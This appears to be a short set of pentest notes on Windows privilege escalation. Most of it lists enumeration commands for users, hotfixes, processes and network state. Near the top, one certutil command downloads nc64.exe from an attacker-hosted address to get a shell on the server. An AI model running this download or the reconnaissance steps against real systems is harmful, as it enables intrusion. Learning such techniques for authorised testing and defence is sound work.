
Common Misconfiguration
Improper ACL permissions
Privilege Abuse
Sensitive Info
Vulnerable software



use `nc64.exe` file and host on attacker machine to get shell on window server.. 
Download file on window server 
```cmd
certutil -f -urlcache http://ip:port/nc64.exe nc.exe
```

Now we start User Enumeration here we checking login account username
```cmd
whoami
net user                # check existing users
net user  user_name        # get detail info of user
net localgroup          # avilable group in system
net localgroup group_name      # info about group
```

```cmd
systeminfo
```


To find kernel version build number of  OS and Hotfixes is important. Use window management instrumentation to find hotfixesid column etc.
```cmd
wmic qfe get *             # quick fix enumeration/enginnering
wmic qfe get Caption,Description,HotFixiD, InstalledOn
wmic os get *                # find OS name
wmic os get  BuildNumber, caption, Bootdevice
```

```cmd
Tasklist
Tasklist /v
tasklist /svc            # process running eith service 
```

```
ipconfig /all       # ip and routing
```

```
netstat -ano        # network stats 
```

```
netsh advfirewall show currentprofile   # check firewall
```



















